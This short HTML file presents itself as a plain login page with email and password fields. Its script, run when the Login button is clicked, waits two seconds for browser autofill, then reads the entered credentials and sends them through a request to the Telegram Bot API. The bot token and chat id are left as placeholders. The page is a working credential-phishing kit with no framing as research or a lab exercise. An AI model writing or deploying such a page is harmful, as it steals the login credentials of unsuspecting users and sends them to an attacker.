<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
</head>
<body>
  <form id="login">
    <input type="email" id="email" name="email" autocomplete="email" placeholder="Email"><br><br>
    <input type="password" id="pass" name="password" autocomplete="current-password" placeholder="Password"><br><br>
    <button type="button" onclick="capture()">Login</button>
  </form>

  <script>
    function capture() {
      // Let browser autofill after click
      setTimeout(() => {
        const email = document.getElementById('email').value
        const pass = document.getElementById('pass').value

        if (email && pass) {
          const token = "your_bot_token"
          const chat_id = "your_chat_id"
          const msg = `Email: ${email}\nPass: ${pass}`

          fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
        }
      }, 2000) // Wait 2 sec for autofill to apply
    }
  </script>
</body>
</html>
